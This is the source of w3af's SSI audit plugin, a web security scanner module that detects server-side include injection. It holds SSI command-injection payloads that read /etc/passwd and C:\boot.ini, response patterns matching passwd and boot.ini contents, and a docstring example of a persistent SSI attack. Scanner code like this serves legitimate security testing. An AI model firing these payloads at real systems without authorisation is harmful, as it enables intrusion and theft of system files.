'''
ssi.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''
import core.controllers.outputManager as om
import core.data.constants.severity as severity
import core.data.kb.knowledgeBase as kb
import core.data.kb.vuln as vuln

from core.controllers.basePlugin.baseAuditPlugin import baseAuditPlugin
from core.data.fuzzer.fuzzer import createMutants
from core.data.esmre.multi_in import multi_in
from core.data.db.disk_list import disk_list


class ssi(baseAuditPlugin):
    '''
    Find server side inclusion vulnerabilities.
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''
    FILE_PATTERNS = (
        "root:x:0:0:",  
        "daemon:x:1:1:",
        ":/bin/bash",
        ":/bin/sh",

        # /etc/passwd in AIX
        "root:!:x:0:0:",
        "daemon:!:x:1:1:",
        ":usr/bin/ksh",

        # boot.ini
        "[boot loader]",
        "default=multi(",
        "[operating systems]",
            
        # win.ini
        "[fonts]",
    )
    _multi_in = multi_in( FILE_PATTERNS )

    def __init__(self):
        baseAuditPlugin.__init__(self)
        
        # Internal variables
        self._fuzzable_requests = disk_list()

    def audit(self, freq ):
        '''
        Tests an URL for server side inclusion vulnerabilities.
        
        @param freq: A fuzzableRequest
        '''
        oResponse = self._uri_opener.send_mutant(freq)
        
        # Used in end() to detect "persistent SSI"
        self._add_persistent_SSI( freq, oResponse )
        
        # Create the mutants to send right now,
        ssi_strings = self._get_ssi_strings()
        mutants = createMutants( freq , ssi_strings, oResponse=oResponse )
        
        self._send_mutants_in_threads(self._uri_opener.send_mutant,
                                      mutants,
                                      self._analyze_result)
            
    def _add_persistent_SSI(self, freq, oResponse):
        '''
        Creates a wrapper object, around the freq variable, and also saves the
        original response to it. Saves the wrapper to a list, that is going to
        be used in the end() method to identify persistent SSI vulnerabilities.
        
        @parameter freq: The fuzzable request to use in the creation of the
                         wrapper object
        @parameter oResponse: The original HTML response to use in the creation
                              of the wrapper object
        @return: None
        '''
        freq_copy = freq.copy()
        
        class wrapper(object):
            def __init__(self, freq, oResponse):
                self.__dict__['freq'] = freq
                self.__dict__['oResponse'] = oResponse
            
            def getOriginalResponseBody(self):
                return self.oResponse.body
                
            def __getattr__(self, attr):
                return getattr(self.__dict__['freq'], attr)
            
            def __setattr__(self, attr, value):
                return setattr(self.__dict__['freq'], attr, value)  
        
        w = wrapper(freq_copy, oResponse)
        self._fuzzable_requests.append(w)
    
    def _get_ssi_strings( self ):
        '''
        This method returns a list of server sides to try to include.
        
        @return: A string, see above.
        '''
        local_files = []
        local_files.append('<!--#exec cmd="cat /etc/passwd" -->')   
        local_files.append('<!--#exec cmd="type C:\\boot.ini" -->')
        
        ### TODO: Add mod_perl ssi injection support
        #local_files.append("<!--#perl ")
        
        return local_files
    
    def _analyze_result( self, mutant, response ):
        '''
        Analyze the result of the previously sent request.
        @return: None, save the vuln to the kb.
        '''
        if self._has_no_bug(mutant):
            file_patterns = self._find_file( response )
            for file_pattern in file_patterns:
                if file_pattern not in mutant.getOriginalResponseBody():
                    v = vuln.vuln( mutant )
                    v.setPluginName(self.getName())
                    v.setName( 'Server side include vulnerability' )
                    v.setSeverity(severity.HIGH)
                    v.setDesc( 'Server side include (SSI) was found at: ' + mutant.foundAt() )
                    v.setId( response.id )
                    v.addToHighlight( file_pattern )
                    kb.kb.append( self, 'ssi', v )
    
    def end(self):
        '''
        This method is called when the plugin wont be used anymore.
        '''
        for fr in self._fuzzable_requests:
            # The _analyze_result is called and "permanent" SSI's are saved 
            # there to the kb
            self._uri_opener.send_mutant( fr, callback=self._analyze_result )
            
            '''
            Example where a persistent SSI can be found:
            
            Say you have a "guestbook" (a CGI application that allows visitors
            to leave messages for everyone to see) on a server that has SSI 
            enabled. Most such guestbooks around the Net actually allow visitors
            to enter HTML code as part of their comments. Now, what happens if a
            malicious visitor decides to do some damage by entering the following:

            <!--#exec cmd="ls" -->

            If the guestbook CGI program was designed carefully, to strip SSI 
            commands from the input, then there is no problem. But, if it was not,
            there exists the potential for a major headache!
            
            For a working example please see moth VM.
            '''
            
        self.print_uniq( kb.kb.getData( 'ssi', 'ssi' ), 'VAR' )
            
    def _find_file( self, response ):
        '''
        This method finds out if the server side has been successfully included in 
        the resulting HTML.
        
        @parameter response: The HTTP response object
        @return: A list of errors found on the page
        '''
        res = []
        for file_pattern_match in self._multi_in.query( response.body ):
            msg = 'Found file pattern. The section where the file pattern is included is (only'
            msg += ' a fragment is shown): "' + file_pattern_match
            msg += '". The error was found on response with id ' + str(response.id) + '.'
            om.out.information(msg)
            res.append( file_pattern_match )
        return res
        
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin finds server side include (SSI) vulnerabilities.
        '''
